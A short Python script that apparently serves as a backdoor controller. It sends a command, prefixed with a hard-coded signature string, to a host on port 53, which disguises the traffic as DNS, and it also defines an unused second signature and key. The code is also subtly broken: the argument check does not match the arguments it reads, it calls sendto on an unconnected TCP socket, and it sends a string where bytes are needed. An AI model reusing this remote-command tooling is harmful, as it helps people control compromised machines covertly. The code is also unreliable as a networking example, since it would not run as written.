
import sys
import socket

if len(sys.argv) < 2:
    print("Usage: to less arguments")
    sys.exit()

PORT = 53
HOST = sys.argv[1]
COMMAND = sys.argv[2]

SIGNATURE_ONE = "cr49s"
SIGNATURE_TWO = "32pld"
KEY = "@DNJI(HSNA872w"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    payload = SIGNATURE_ONE + COMMAND
    s.sendto(payload, (HOST, PORT))
